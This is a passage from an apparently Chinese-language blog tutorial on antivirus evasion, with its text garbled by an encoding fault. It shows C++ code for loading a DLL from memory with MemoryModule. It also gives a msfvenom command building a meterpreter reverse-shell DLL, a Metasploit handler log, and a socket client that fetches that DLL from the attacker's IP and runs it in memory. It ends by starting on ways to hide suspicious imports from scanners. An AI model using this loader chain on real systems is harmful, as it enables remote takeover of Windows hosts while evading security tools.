è½½DLLæ–‡ä»¶ï¼Œä½¿å…¶è¿è¡Œï¼Œçœ‹èµ·æ¥æ˜¯ä¸€ä¸ªåŸºç¡€æ“ä½œï¼Œé‚£ä¹ˆè¿˜æœ‰å¦å¤–ä¸€ç§æ–¹å¼å—ï¼Ÿ</p><p>æ¥ä¸‹æ¥è´´ä¸ŠMemoryModuleçš„ä½¿ç”¨æ–¹æ³•ï¼š</p><ol><li>å°†è¦åŠ è½½çš„PEæ–‡ä»¶è¯»å…¥å†…å­˜</li><li>åˆå§‹åŒ–MemoryModuleå¥æŸ„</li><li>è£…è½½å†…å­˜</li><li>è·å¾—å¯¼å‡ºå‡½æ•°åœ°å€</li><li>æ‰§è¡Œå¯¼å‡ºå‡½æ•°</li><li>é‡Šæ”¾MemoryModuleå¥æŸ„</li></ol><p>è¿™é‡Œæˆ‘å°†MemoryModuleé¡¹ç›®ä»£ç æ”¾å…¥å½“å‰é¡¹ç›®ï¼š</p><p>ä¸»è¦æ˜¯ï¼š<code>MemoryModule.h</code>ã€<code>MemoryModule.cpp</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€æ–‡ä»¶å¹¶è·å–å¤§å°</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">msg RunMsg;  <span class="comment">// msgå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line">HMEMORYMODULE hModule; <span class="comment">// MemoryModuleå¥æŸ„ï¼Œåº”è¯¥å¯ä»¥è¿™ä¹ˆç†è§£,,</span></span><br><span class="line">HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; <span class="comment">// æ‰“å¼€PEæ–‡ä»¶çš„å¥æŸ„</span></span><br><span class="line">WCHAR szBadCodeFile[] = TEXT(<span class="string">&quot;C:\Users\admin\Documents\Visual Studio 2012\Projects\BadCode\Debug\BadCode-DLL.dll&quot;</span>); <span class="comment">// PEæ–‡ä»¶çš„ç‰©ç†è·¯å¾„</span></span><br><span class="line">DWORD dwFileSize = <span class="number">0</span>; <span class="comment">// PEæ–‡ä»¶å¤§å°</span></span><br><span class="line">DWORD dwReadOfFileSize = <span class="number">0</span>; <span class="comment">// å·²è¯»å–çš„PEæ–‡ä»¶å¤§å°</span></span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>; <span class="comment">// PEæ–‡ä»¶çš„å†…å­˜åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);</span><br><span class="line"><span class="comment">// å¦‚æœæ‰“å¼€å¤±è´¥ç›´æ¥é€€å‡º</span></span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç”³è¯·æ”¾ç½®PEæ–‡ä»¶çš„å†…å­˜ç©ºé—´</span></span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"><span class="comment">// è¯»å–æ–‡ä»¶</span></span><br><span class="line">ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,<span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// å¦‚æœè¯»å–é”™è¯¯ç›´æ¥é€€å‡º</span></span><br><span class="line"><span class="keyword">if</span>(dwReadOfFileSize != dwFileSize)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å…³é—­æ‰“å¼€PEæ–‡ä»¶çš„å¥æŸ„</span></span><br><span class="line">CloseHandle(hBadCodeDll);</span><br><span class="line"><span class="comment">// å¯¼å…¥PEæ–‡ä»¶</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// å¦‚æœåŠ è½½å¤±è´¥ï¼Œå°±é€€å‡º</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è·å–msgå¯¼å‡ºå‡½æ•°åœ°å€</span></span><br><span class="line">RunMsg = (msg)MemoryGetProcAddress(hModule,<span class="string">&quot;msg&quot;</span>);</span><br><span class="line"><span class="comment">// è¿è¡Œmsgå‡½æ•°</span></span><br><span class="line">RunMsg();</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// é‡Šæ”¾PEå†…å­˜</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åå°„DLL-ä¸-MSF-è”åŠ¨"><a href="#åå°„DLL-ä¸-MSF-è”åŠ¨" class="headerlink" title="åå°„DLL ä¸ MSF è”åŠ¨"></a>åå°„DLL ä¸ MSF è”åŠ¨</h2><blockquote><p>é€šè¿‡Socketå°†Msfç”Ÿæˆçš„DLLç»™æ¥æ”¶åˆ°å†…å­˜ä¸­ï¼Œç„¶åè½½å…¥MemoryModuleä¸­ï¼Œç›´æ¥æ‰§è¡Œã€‚</p></blockquote><p>ç”ŸæˆDLL</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.170.138 LPORT&#x3D;8899 -f dll -o ~&#x2F;y.dll</span><br></pre></td></tr></table></figure><p>è®¾ç½®MSF dll å‘å°„å™¨(set DLL å‘½ä»¤)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.170.138 -P 8899</span><br><span class="line">[*] Payload handler running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8899 </span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;patchupdllinject&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.170.138 </span><br><span class="line">LHOST &#x3D;&gt; 192.168.170.138</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 8888</span><br><span class="line">LPORT &#x3D;&gt; 8888</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set DLL ~&#x2F;y.dll</span><br><span class="line">DLL &#x3D;&gt; ~&#x2F;y.dll</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.170.138:8888 </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; </span><br></pre></td></tr></table></figure><p>å†™ä»£ç å®ç°å®¢æˆ·ç«¯è·ï¼Œè·å–MSF ç”Ÿæˆçš„DLL</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MemoryModule.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(*Module)</span><span class="params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span> <span class="params">(*msg)</span><span class="params">(VOID)</span></span>;</span><br><span class="line">PBYTE bFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetPEDLL</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD dwError;</span><br><span class="line">WORD sockVersion = MAKEWORD(<span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET socks;</span><br><span class="line">SHORT sListenPort = <span class="number">8888</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (socks == INVALID_SOCKET)</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(sListenPort);</span><br><span class="line"><span class="built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;192.168.170.138&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">connect</span>(socks,(struct sockaddr *)&amp;<span class="built_in">sin</span>,<span class="keyword">sizeof</span>(<span class="built_in">sin</span>)) == SOCKET_ERROR )</span><br><span class="line">&#123;</span><br><span class="line">dwError = GetLastError();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">2650</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">4</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ZeroMemory(bFileBuffer,PAYLOAD_SIZE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ret = recv(socks,(PCHAR)bFileBuffer,<span class="number">5120</span>,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">closesocket(socks);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å¼€æ–‡ä»¶å¹¶è·å–å¤§å°</span></span><br><span class="line"><span class="function">DWORD <span class="title">OpenBadCodeDLL</span><span class="params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;</span><br><span class="line">DWORD dwHighFileSize = <span class="number">0</span>;</span><br><span class="line">DWORD dwLowFileSize = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// æ‰“å¼€æ–‡ä»¶</span></span><br><span class="line">hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line">dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);</span><br><span class="line"><span class="keyword">return</span> dwLowFileSize;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">HMEMORYMODULE hModule;</span><br><span class="line">Module DllMain;</span><br><span class="line">bFileBuffer = <span class="keyword">new</span> BYTE[PAYLOAD_SIZE];</span><br><span class="line">GetPEDLL();</span><br><span class="line"><span class="comment">// å¯¼å…¥PEæ–‡ä»¶</span></span><br><span class="line">hModule = MemoryLoadLibrary(bFileBuffer);</span><br><span class="line"><span class="comment">// å¦‚æœåŠ è½½å¤±è´¥ï¼Œå°±é€€å‡º</span></span><br><span class="line"><span class="keyword">if</span>(hModule == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è·å–msgå¯¼å‡ºå‡½æ•°åœ°å€</span></span><br><span class="line">DllMain = (Module)MemoryGetProcAddress(hModule,<span class="string">&quot;DllMain&quot;</span>);</span><br><span class="line"><span class="comment">// è¿è¡Œmsgå‡½æ•°</span></span><br><span class="line">DllMain(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"><span class="comment">// é‡Šæ”¾èµ„æº</span></span><br><span class="line">DWORD dwThread;</span><br><span class="line">HANDLE hThread = CreateThread(<span class="literal">NULL</span>,<span class="literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;dwThread);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread,INFINITE);</span><br><span class="line"></span><br><span class="line">MemoryFreeLibrary(hModule);</span><br><span class="line"><span class="comment">// é‡Šæ”¾PEå†…å­˜</span></span><br><span class="line"><span class="keyword">delete</span> [] bFileBuffer;</span><br><span class="line"><span class="keyword">return</span> GetLastError();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GetPEDLLå‡½æ•°ä¸»è¦æ˜¯ä»MSFä¸Šè·å–DLLï¼Œé€šè¿‡recvå‡½æ•°ä¸æ–­æ¥æ”¶ï¼Œåç§»è·å¾—DLLåœ°å€ï¼Œç„¶åæ‰”ç»™MemoryGetProcAddressã€‚</p><p>PS:</p><p>ä¸åŒä½æ•°è¦å¯¹åº”ä¸åŒçš„payloadï¼Œç¼–è¯‘å¹³å°ä¹Ÿè¦äº’ç›¸å¯¹åº”</p><p>å¼•å…¥åå°„DLLåŠ è½½è¿™ä¸ªæŠ€æœ¯ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨è¿™ä¸ªæŠ€æœ¯ï¼Œå¦‚æœæƒ³æ·±å…¥ç ”ç©¶ï¼Œè¿˜éœ€è¦å­¦ä¹ Windows PEç›¸å…³çš„åŸºç¡€çŸ¥è¯†ã€‚</p><h1 id="ç¬¬7è¯¾"><a href="#ç¬¬7è¯¾" class="headerlink" title="ç¬¬7è¯¾"></a>ç¬¬7è¯¾</h1><h2 id="å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰"><a href="#å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰" class="headerlink" title="å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰"></a>å¯¼å…¥åœ°å€è¡¨ï¼ˆIATï¼‰</h2><blockquote><p>Import Address Table ç”±äºå¯¼å…¥å‡½æ•°å°±æ˜¯è¢«ç¨‹åºè°ƒç”¨ä½†å…¶æ‰§è¡Œä»£ç åˆä¸åœ¨ç¨‹åºä¸­çš„å‡½æ•°ï¼Œè¿™äº›å‡½æ•°çš„ä»£ç ä½äºä¸€ä¸ªæˆ–è€…å¤šä¸ªDLL ä¸­ï¼Œå½“PE æ–‡ä»¶è¢«è£…å…¥å†…å­˜çš„æ—¶å€™ï¼ŒWindows è£…è½½å™¨æ‰å°†DLL è£…å…¥ï¼Œå¹¶å°†è°ƒç”¨å¯¼å…¥å‡½æ•°çš„æŒ‡ä»¤å’Œå‡½æ•°å®é™…æ‰€å¤„çš„åœ°å€è”ç³»èµ·æ¥(åŠ¨æ€è¿æ¥)ï¼Œè¿™æ“ä½œå°±éœ€è¦å¯¼å…¥è¡¨å®Œæˆ.å…¶ä¸­å¯¼å…¥åœ°å€è¡¨å°±æŒ‡ç¤ºå‡½æ•°å®é™…åœ°å€ã€‚ - æ¥æºç™¾åº¦ç™¾ç§‘</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210220160321.png"></p><p>åœ¨PEç»“æ„ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå¯¼å…¥è¡¨ï¼Œå¯¼å…¥è¡¨ä¸­å£°æ˜äº†è¿™ä¸ªPEæ–‡ä»¶ä¼šè½½å…¥å“ªäº›æ¨¡å—ï¼ŒåŒæ—¶æ¯ä¸ªæ¨¡å—çš„ç»“æ„ä¸­åˆä¼šæŒ‡å‘æ¨¡å—ä¸­çš„ä¸€äº›å‡½æ•°åç§°ã€‚è¿™æ ·çš„ç»„ç»‡å…³ç³»æ˜¯ä¸ºäº†å‘Šè¯‰æ“ä½œç³»ç»Ÿè¿™äº›å‡½æ•°çš„åœ°å€åœ¨å“ªé‡Œï¼Œæ–¹ä¾¿ä¿®æ­£è°ƒç”¨åœ°å€ã€‚</p><p>å¦‚æœä¸€ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å¤§å°åœ¨300KBä»¥å†…ï¼Œå¹¶ä¸”å¯¼å…¥å‡½æ•°åˆæœ‰<code>Virtual Alloc</code>ã€<code>CreateThread</code>ï¼Œä¸”<code>VirtualAlloc</code>çš„æœ€åä¸€ä¸ªå‚æ•°æ˜¯<code>0x40</code>ï¼Œé‚£ä¹ˆæ­¤æ–‡ä»¶æ˜¯é«˜å±æ–‡ä»¶ã€‚</p><p><code>0x40</code>è¢«å®šä¹‰åœ¨<code>winnt.h</code>ä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#define PAGE_NOACCESS           0x01    </span><br><span class="line">#define PAGE_READONLY           0x02    </span><br><span class="line">#define PAGE_READWRITE          0x04    </span><br><span class="line">#define PAGE_WRITECOPY          0x08    </span><br><span class="line">#define PAGE_EXECUTE            0x10    </span><br><span class="line">#define PAGE_EXECUTE_READ       0x20    </span><br><span class="line">#define PAGE_EXECUTE_READWRITE  0x40    </span><br><span class="line">#define PAGE_EXECUTE_WRITECOPY  0x80  </span><br></pre></td></tr></table></figure><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210220161431763.png)</p><h2 id="GetProcAddress-è·å–å‡½æ•°åœ°å€"><a href="#GetProcAddress-è·å–å‡½æ•°åœ°å€" class="headerlink" title="GetProcAddress è·å–å‡½æ•°åœ°å€"></a>GetProcAddress è·å–å‡½æ•°åœ°å€</h2><p><code>GetProcAddress</code>è¿™ä¸ªAPIåœ¨<code>Kernel32.dll</code>ä¸­è¢«å¯¼å‡ºï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä»ä¸€ä¸ªåŠ è½½çš„æ¨¡å—ä¸­è·å–å‡½æ•°çš„åœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FARPROC <span class="title">GetProcAddress</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HMODULE hModule, <span class="comment">// æ¨¡å—å¥æŸ„</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPCSTR  lpProcName <span class="comment">// å‡½æ•°åç§°</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><code>FARPROC</code>è¢«å®šä¹‰åœ¨äº†<code>minwindef.h</code>ä¸­ï¼Œå£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WINAPI      __stdcall</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(FAR WINAPI *FARPROC)</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›å®ƒçš„å£°æ˜èƒ½å¤Ÿå‘ç°æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´<code>GetProcAddress</code>è¿”å›çš„æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°åœ°å€ã€‚</p><h2 id="è‡ªå·±å†™ä»£ç è·å–å‡½æ•°åœ°å€"><a href="#è‡ªå·±å†™ä»£ç è·å–å‡½æ•°åœ°å€" class="headerlink" title="è‡ªå·±å†™ä»£ç è·å–å‡½æ•°åœ°å€"></a>è‡ªå·±å†™ä»£ç è·å–å‡½æ•°åœ°å€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VirtualAlloc -&gt; VirtualProtect -&gt; CreateThread -&gt; WaitForSingleObject</span><br></pre></td></tr></table></figure><p>è¿™å‡ ä¸ªå‡½æ•°æ˜¯æ¯”è¾ƒæ˜æ˜¾çš„ï¼Œå¹¶ä¸”éƒ½åœ¨<code>kernel32.dll</code>ä¸­å¯¼å‡ºï¼Œæˆ‘ä»¬å°è¯•è‡ªå·±å®šä¹‰ä»–ä»¬çš„å‡½æ•°æŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨<code>GetProcAddress</code>è·å–å‡½æ•°åœ°å€ï¼Œè°ƒç”¨è‡ªå·±çš„å‡½æ•°åç§°ã€‚</p><p>æ–°å»ºC/C++é¡¹ç›®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 